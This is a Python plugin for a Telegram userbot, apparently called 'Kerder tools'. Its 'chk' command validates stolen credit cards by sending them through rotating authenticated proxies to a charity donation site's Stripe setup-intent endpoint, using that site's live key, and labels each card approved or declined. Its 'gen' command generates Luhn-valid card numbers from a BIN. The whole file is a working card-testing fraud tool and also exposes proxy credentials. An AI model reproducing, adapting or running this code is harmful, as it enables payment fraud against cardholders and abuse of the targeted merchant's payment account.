"Kerder tools ayonima"
import time, requests, json, random,luhn
requests.packages.urllib3.disable_warnings()
from bs4 import BeautifulSoup as bs
from userge import userge, Message


#chk
@userge.on_cmd("chk", about={
	'header': "SETI CHECK",
	'usage': "{tr}chk [cc]|[mm]|[yy]|[cvv]\n"})
	
async def chk(message: Message):
	"""SETI CHECK"""
	time_start = time.time()
	replied = message.input_str
	if not replied:
		await message.err("```Usage: chk [cc]|[mm]|[yy]|[cvv]```", del_in=5)
		return 
	if "|" not in replied:
		await message.err("```Usage: chk [cc]|[mm]|[yy]|[cvv]```", del_in=5) 
		return
	await message.edit("```Checking...```")
	list = replied.strip()
	try:
		cc = list.split('|')[0]
		mm = list.split('|')[1]
		yy = list.split('|')[2]
		cvv = list.split('|')[3]
	except:
		await message.err("```Usage: chk [cc]|[mm]|[yy]|[cvv]```", del_in=5) 
		return 
	ses = requests.Session()
	auth_proxy = random.choice([ 'dvzqfywc-rotate:4xa4f5gv9tpt' , 'uyyrqimx-rotate:m02rdhijp6g1' , 'qlxasaqa-rotate:zwc36eytxxij' ])
	proxies = {'http': f'http://{auth_proxy}@p.webshare.io:80', 'https': f'http://{auth_proxy}@p.webshare.io:80'}
	ses.proxies = proxies 
	#infobin
	url_bin = "http://bins.su"
	head_bin = { 
	"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"Accept-Language":"en-US,en;q=0.9",
	"User-Agent": "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
	}
	data_bin = {
	"action":"searchbins",
	"bins":cc[:6]
	}
	info_bin = ses.post(url_bin,headers=head_bin,data=data_bin).text
	aaa = bs(info_bin, 'html.parser').find("div",{"id":"result"}).findAll("td")
	#print(aaa)
	bin_cr = aaa[7].text
	bin_vendor = aaa[8].text
	bin_type = aaa[9].text
	bin_level = aaa[10].text 
	bin_bank = aaa[11].text
	res_bin = f"""
Bin: {cc[:6]}
Country: {bin_cr}
Vendor: {bin_vendor}
Type: {bin_type}
Level: {bin_level}
"""
	#print(res_bin)
	
	#req_0
	url_0 = "https://www.saveiman.com/donation-page1"
	head_0 = {
	'Host':'www.saveiman.com',
	'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'accept-language':'en-GB,en-US;q=0.9,en;q=0.8',
	'sec-fetch-site':'same-origin',
	'sec-fetch-mode':'navigate',
	'sec-fetch-dest':'document',
	'referer':'https://www.saveiman.com/en',
	"User-Agent": "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1" 
	}
	raw_0 = ses.get(url_0, headers=head_0).text
	funnel_id = bs(raw_0, 'html.parser').find("meta",{"property":"cf:funnel_id"})["content"]
	page_id = bs(raw_0, 'html.parser').find("meta",{"property":"cf:page_id"})["content"]
	funnel_step_id = bs(raw_0, 'html.parser').find("meta",{"property":"cf:funnel_step_id"})["content"]
	account_id = bs(raw_0, 'html.parser').find("meta",{"property":"cf:account_id"})["content"]
	user_id = bs(raw_0, 'html.parser').find("meta",{"property":"cf:user_id"})["content"]
	page_code = bs(raw_0, 'html.parser').find("meta",{"property":"cf:page_code"})["content"]
	
	#req_1
	url_1 = "https://www.saveiman.com/api/non_oauth/stripe_intents/setup_intents/create"
	head_1 = {
	'accept':'application/json',
	'accept-language':'en-GB,en-US;q=0.9,en;q=0.8',
	'content-type':'application/json',
	'origin':'https://www.saveiman.com',
	'referer':'https://www.saveiman.com/donation-page1',
	'sec-fetch-dest':'empty',
	'sec-fetch-mode':'cors',
	'sec-fetch-site':'same-origin',
	"User-Agent": "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"  
	}
	data_1 = {
	"page_id":page_id,
	"stripe_publishable_key":"pk_live_BC0qtENgeicsZ9mG90hfis6U00u5xdTi8c",
	"stripe_account_id":"acct_1EXqH5Bflqc6bhi6"
	}
	data_1 = json.dumps(data_1)
	raw_1 = ses.post(url_1, headers=head_1, data=data_1).text
	#print(raw_1)
	seti = raw_1.split(":")[1].replace('"','').replace('}','')
	seti1 = seti.split("_secret_")[0]
	#print(seti1)
	
	#req_2
	url_2 = f"https://api.stripe.com/v1/setup_intents/{seti1}/confirm"
	head_2 = {
	'authority':'api.stripe.com',
	'method':'POST',
	'scheme':'https',
	'accept':'application/json',
	'accept-encoding':'gzip, deflate, br',
	'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
	'content-type':'application/x-www-form-urlencoded',
	'origin':'https://js.stripe.com',
	'referer':'https://js.stripe.com/',
	'sec-fetch-dest':'empty',
	'sec-fetch-mode':'cors',
	'sec-fetch-site':'same-site',
	"User-Agent": "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"   
	}
	data_2 = {
	'payment_method_data[type]':'card',
	'payment_method_data[billing_details][address][line1]':'22 Ave',
	'payment_method_data[billing_details][address][city]':'New York',
	'payment_method_data[billing_details][address][postal_code]':'10080',
	'payment_method_data[card][number]':cc,
	'payment_method_data[card][cvc]':cvv,
	'payment_method_data[card][exp_month]':mm,
	'payment_method_data[card][exp_year]':yy,
	'payment_method_data[guid]':'308b820c-7175-4f66-9e72-30badce62155d62117',
	'payment_method_data[muid]':'2dd8fde2-d2a3-432e-a91a-9dec8a7dd2b968909e',
	'payment_method_data[sid]':'7fd7f80e-cef5-4411-b209-916d461c6b141fe74d',
	'payment_method_data[payment_user_agent]':'stripe.js%2F80a87e03e%3B+stripe-js-v3%2F80a87e03e',
	'payment_method_data[time_on_page]':'78454',
	'expected_payment_method_type':'card',
	'use_stripe_sdk':'true',
	'webauthn_uvpa_available':'true',
	'spc_eligible':'false',
	'key':'pk_live_BC0qtENgeicsZ9mG90hfis6U00u5xdTi8c',
	'_stripe_account':'acct_1EXqH5Bflqc6bhi6',
	'client_secret':seti 
	}
	raw_2 = ses.post(url_2, headers=head_2, data=data_2).text 
	#print(raw_2)
	
	#response
	if '"seller_message": "Payment complete."' in raw_2:
		status = "Approved"
		msg = "Thank You"
	elif '"cvc_check": "pass",' in raw_2:
		status = "Approved"
		msg = "CVV LIVE"
	elif 'Thank You' in raw_2:
		status = "Approved"
		msg = "Thank You"
	elif '"status": "succeeded"' in raw_2:
		status = "Approved"
		msg = "CVV LIVE"
	elif 'Your card zip code is incorrect.' in raw_2:
		status = "Approved"
		msg = "Incorrect zip"
	elif 'incorrect_zip' in raw_2:
		status = "Approved"
		msg = "Incorrect zip"
	elif 'insufficient_funds' in raw_2:
		status = "Approved"
		msg = "Insufficient funds"
	elif 'fraudulent' in raw_2:
		status = "Approved"
		msg = "Fraudulent card"
	elif 'requires_action' in raw_2:
		status = "Approved"
		msg = "CVV LIVE"
	elif "Your card's security code is incorrect." in raw_2:
		status = "Declined"
		msg = "Your card's security code is incorrect."
	elif "invalid_cvc" in raw_2:
		status = "Declined"
		msg = "Your card's security code is incorrect."
	elif "incorrect_cvc" in raw_2:
		status = "Declined"
		msg = "Your card's security code is incorrect."
	elif "lost_card" in raw_2:
		status = "Declined"
		msg = "Lost card"
	elif "stolen_card" in raw_2:
		status = "Declined"
		msg = "Stolen card"
	elif "pickup_card" in raw_2:
		status = "Declined"
		msg = "Pickup card"
	elif "expired_card" in raw_2:
		status = "Declined"
		msg = "Expired card"
	elif 'Your card number is incorrect.' in raw_2:
		status = "Declined"
		msg = "Your card number is incorrect."
	elif 'do_not_honor' in raw_2:
		status = "Declined"
		msg = "Do not honor"
	elif 'generic_decline' in raw_2:
		status = "Declined"
		msg = "Generic decline"
	elif 'invalid_account' in raw_2:
		status = "Declined"
		msg = "Invalid account"
	elif 'processing_error' in raw_2:
		status = "Declined"
		msg = "Processing Error"
	elif 'transaction_not_allowed' in raw_2:
		status = "Declined"
		msg = "Transaction not allowed"
	elif 'declined' in raw_2:
		status = "Declined"
		msg = "Your card was declined."
	elif 'not_supported' in raw_2:
		status = "Declined"
		msg = "Your card is not supported."
	else:
		status = "Declined"
		msg = "Check again"
	
	ip_proxy = ses.get("http://icanhazip.com/").text.replace('\n','')
	time_end = time.time() - time_start
	result_cc = f"""{status}
	
CC » `{cc}|{mm}|{yy}|{cvv}`
Response » {msg}
Gateway » SETI

BIN Info » {bin_vendor} - {bin_type} - {bin_level}
Bank » {bin_bank}
Country » {bin_cr}

IP Proxy » {ip_proxy}
Time » {str(time_end)[:3]}s
"""
	await message.edit(result_cc)
	

#gen
@userge.on_cmd("gen", about={
	'header': "Generate CC",
	'usage': "{tr}gen 400022xxxxxx\n"})
	
async def gen(message: Message):
	"""Generate CC"""
	time_start = time.time()
	replied = message.input_str
	if not replied:
		await message.err("```Usage: gen 400022xxxxxx```", del_in=5)
		return 
	await message.edit("```Generate CC...```")
	list = replied.strip()
	bin = list.split("|")[0].replace("x","")
	
	#INFO_BIN
	ses= requests.Session()
	url_bin = "http://bins.su"
	head_bin = { 
	"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"Accept-Language":"en-US,en;q=0.9",
	"User-Agent": "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
	}
	data_bin = {
	"action":"searchbins",
	"bins":bin[:6]
	}
	info_bin = ses.post(url_bin,headers=head_bin,data=data_bin).text
	aaa = bs(info_bin, 'html.parser').find("div",{"id":"result"}).findAll("td")
	bin_cr = aaa[7].text
	bin_vendor = aaa[8].text
	bin_type = aaa[9].text
	bin_level = aaa[10].text 
	bin_bank = aaa[11].text
	a = 0
	cx = []
	while True:
		jml = 16-(len(bin))
		num = str(random.randint(1, 999999999999))[:jml]
		cc = f"{bin}{num}"
		if luhn.verify(cc) == True:
			a += 1
			try:
				mm = list.split("|")[1]
				int(mm)
			except:
				mm = random.choice(['01','02','03','04','05','06','07','08','09','10','11','12'])
			try:
				yy = list.split("|")[2]
				int(yy)
			except:
				yy = random.choice(['2022','2023','2024','2025','2026'])
			try:
				cvv = list.split("|")[3]
				int(cvv)
			except:
				cvv = random.randint(111, 999)
			cx.append(f"{cc}|{mm}|{yy}|{cvv}")
		if a == 10:
			break
	time_end = time.time() - time_start
	result_gen = f"""BIN » {list[:6]}
BIN Info » {bin_vendor} - {bin_type} - {bin_level}
Bank » {bin_bank}
Country » {bin_cr}

`{cx[0]}`
`{cx[1]}`
`{cx[2]}`
`{cx[3]}`
`{cx[4]}`
`{cx[5]}`
`{cx[6]}`
`{cx[7]}`
`{cx[8]}`
`{cx[9]}`

Time » {str(time_end)[:3]}s
"""
	await message.edit(result_gen)



